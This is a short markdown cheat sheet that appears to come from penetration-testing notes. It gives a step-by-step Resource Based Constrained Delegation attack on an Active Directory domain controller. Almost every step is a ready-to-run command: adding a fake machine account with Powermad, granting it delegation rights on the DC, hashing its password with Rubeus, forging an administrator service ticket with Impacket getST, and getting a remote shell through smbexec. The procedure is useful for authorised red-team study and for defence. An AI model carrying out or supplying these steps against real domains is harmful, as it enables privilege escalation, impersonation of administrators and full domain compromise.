## Resource Based Constrained Delegation (RBCD)

## TOOLS: Bloodhound, Powermad, Powerview, Kekeo, Impacket, AD powershell module

### Requirements: Your current user belongs to a group that has write access/generic all privileges on the DC.

### STEPS:

#### 1) Transfer rubeus and powermad on target machine

#### 2) Import Powermad

    Import-Module ./powermad.ps1 (Import powermad)

#### 3) Import ActiveDirectory Module

    Import-Module ActiveDirectory

#### 4) Set Variables

    Set-Variable -Name "PwnPC" -Value "PWN01"

#### 

    Set-Variable -Name "targetComputer" -Value "DC" 

#### 5) With Powermad, add the new fake computer object to AD

    New-MachineAccount -MachineAccount (Get-Variable -Name "PwnPC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose ( With powermad, add the new fake computer object to AD)

#### 6) With built-in AD modules, give the new fake computer object the Constrained Delegation privilege

    Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "PwnPC").Value + '$') 

#### 7) With built-in AD modules, check that the last command worked

    Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount 

#### 8) With Rubeus, generate the new fake computer object password hashes.

    .\rubeus.exe hash /password:123456 /user:PWN01$ /domain:DOMAIN.LOCAL 

#### 9) Using the getST impacket module, generate a ccached TGT and used KRB5CCNAME pass the ccache file for the requested service

    Impacket-getST DOMAIN.LOCAL/PWN01 -dc-ip DC.DOMAIN.LOCAL -impersonate administrator -spn http://DC.DOMAIN.LOCAL -aesKey GENERATED_AESKEY 

#### 10) Set local variable of KRB5CCNAME to pass the ccache TGT file for the requested service

    export KRB5CCNAME=administrator.ccache 

#### 11) Use smbexec impacket module to connect with the TGT we just made to the server as the user administrator over SMB

    impacket-smbexec DOMAIN.LOCAL/administrator@DC.DOMAIN.LOCAL -no-pass -k 

#### 12) PWNED!
